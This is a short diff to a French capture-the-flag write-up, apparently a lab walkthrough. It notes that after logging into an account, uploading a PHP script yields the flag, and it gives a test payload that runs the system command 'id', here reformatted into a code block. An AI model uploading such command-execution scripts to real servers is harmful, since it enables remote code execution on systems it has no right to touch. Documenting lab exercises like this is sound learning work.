@@ -8,8 +8,11 @@ blahblahblah
 
 apres avoir pu se connecter sur le compte, il suffit d'uploader un script en php pour obtenir le flag
 
-code test dans un fichier php : <?php echo system('id'): ?>
+code test dans un fichier php : 
 
+```php
+<?php echo system('id'): ?>
+```
 
 ![php](Resources/php.png)
 
